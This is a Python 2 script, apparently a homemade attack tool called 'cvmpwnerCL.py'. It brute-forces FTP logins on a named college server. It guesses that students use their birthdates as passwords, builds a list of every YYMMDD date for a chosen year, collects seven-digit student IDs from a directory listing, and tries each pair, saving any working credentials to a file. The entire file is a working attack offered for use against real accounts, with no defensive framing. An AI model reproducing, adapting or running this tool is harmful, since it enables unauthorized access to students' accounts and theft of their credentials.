#!/usr/bin/python

# -*- coding: utf-8 -*-

import sys
import ftplib
import socket
import os
import time
import optparse
import re

def main():
    parser = optparse.OptionParser("usage: ./cvmpwnerCL.py "+\
                                   "(-y <year> (-r <results>)) (-l)")
    parser.add_option('-y',dest='year', type='string', help="The birth year you want to raid")
    parser.add_option('-r',dest='results', type='string', help="The file where to write results")
    parser.add_option('-l', action="store_true", dest='list', help="Adds every known users (CVM_dir.txt) to the list of users to test (users.txt)")
    (options, args) = parser.parse_args()

    server = "edu.cvm.qc.ca"
        
    user_input = "Ressources/lists/CVM_dir.txt"
    user_list = "Ressources/lists/users.txt"
    pass_list = "Ressources/lists/pass.txt"
        
    if (options.list):
        list_users(user_input, user_list)

    elif (not options.list and options.year == None):
        print parser.usage
        return 0

    else:
        if (options.results == None):
            results = "working_login.txt"
        else:
            results = options.results

        year = int(options.year[len(options.year)-2:len(options.year)])
        list_pass(year,pass_list)
        pwn_that(server,user_list,pass_list,results)
        
    return 0


def pwn_that(server,user_list, pass_list,results):

	if not os.path.isfile(results):
		f = open(results,"w")
		f.close()

	socket.setdefaulttimeout(2)
        ans = "unknown"
        try:
                s = socket.socket()
		s.connect((server,21))
		
		try:
			ans = s.recv(1024)
			s.close()
		except:
                        s.close()
                        pass
        
        except:
                print "[-] No service on port 21. Attack stopped."
                s.close()
                return 0
        
        
	print "[+] The pwning has begun on "+server+" using "+user_list+" and "+pass_list+"\n\n[+] Service: "+ans

        f = open(user_list,"r")
	user_text_list = f.readlines()
	f.close()

	f = open(pass_list,"r")
	pass_text_list = f.readlines()
	f.close()

	user_number = 0
	password_number = 0

	ligne_user = nombre_ligne(user_list)
	ligne_pass = nombre_ligne(pass_list)

	usernames = [""] * ligne_user
	passwords = [""] * ligne_pass

	maxtry = ligne_user * ligne_pass

	for username in user_text_list:
            
		usernames[user_number] = username
		user_number += 1
		
	for password in pass_text_list:
            
		passwords[password_number] = password
		password_number += 1

	i = 0
	j = 0
	success = 0

	while i < password_number:
		while j < user_number:
			try:
				ftp = ftplib.FTP(server)

                                print "[+] Trying combination "+usernames[j][:len(usernames[j])-1]+":"+passwords[i][:len(passwords[i])-1]

				ftp.login(usernames[j],passwords[i])
				print "[+] Login Found"
				f = open(results,"r")
				g = f.read()
				f.close()
				
				#g = g+usernames[j]+":"+passwords[i]+"\n"
				g = g+usernames[j][:len(usernames[j])-1]+":"+passwords[i]
				
				f = open(results,"w")
				f.write(g)
				f.close()
				
				ftp.quit()
				success += 1
				j += 1
			except KeyboardInterrupt:
				print "\n[!] End of operation."
				return 0
			except:
				j += 1
				pass
		i += 1
		j = 0

	print "[+] The Attack is done.\nTotal of "+str(success)+" logins found\n\nResults in "+results

def list_pass(year,pass_list):
    try:
        month = 1
        day = 1
	
        f = open(pass_list,"w+")
		
        total_dates = 0
		
        while month < 13:
		
            while day < 32:

        	if month == 2 and day > 29:
		    day = 32
		elif month == 4 and day > 30:
		    day = 32
		elif month == 6 and day > 30:
                    day = 32
		elif month == 9 and day > 30:
		    day = 32
		elif month == 11 and day > 30:
		    day = 32
		else:
		    syear = tdigit(year)
		    smonth = tdigit(month)
		    sday = tdigit(day)
			
		    current_code = syear + smonth + sday
		    f.write(current_code)
		    f.write("\n")
	            total_dates = total_dates + 1
                    day = day + 1
	    month = month + 1
	    day = 1
			
	f.close()
	print "[+] You have "+str(total_dates)+" passwords listed"

    except:
	print "[-] Error! Wrong numbers/password file? :3"


def list_users(user_input,user_list):
	print "[+] Updating user list"
	f = open(user_input,"r")
	if not f:
		print "[-] Cant open dictionary file"
		return 0
	dlist = f.read()
	f.close()
	
	size = len(dlist)

	f = open(user_list,"w")

	if not f:
		"[-] Cant open user file"
	
	i = 39
	j = 46
	k = 0
	
	ulist = ""
	p = re.compile("[0-9]{7}")

	
	while j < size:
		print dlist[i:j]
		#if dlist[i:j] != '20':
		if p.match(dlist[i:j]):
			ulist += "\n"
			ulist += dlist[i:j]
			i = i+47
			j = j+47
			k = k+1
		else:
			print "[+] Writing to file"
			f.write(ulist)
			print "[+] Done! You have "+str(k)+" users listed.\n"
			print "[!] Remember the data is from the CVM_dir.txt file."
			print "[!] If you lost it, you can get it at the root of the ftp by issuing a directory listing command (ls)."
			print "[!] You can also insert usernames manually in the file \"users.txt\""
			break
def tdigit(numb):
	if numb < 10:
		final = '0'
		final += str(numb)
	else:
		final = str(numb)
	return final
    
def nombre_ligne(fichier):
	f = open(fichier,"r")
	texte = f.readlines()
	f.close()
	l = 0	
	for line in texte:
		l += 1
	return l

if __name__ == "__main__":
    main()
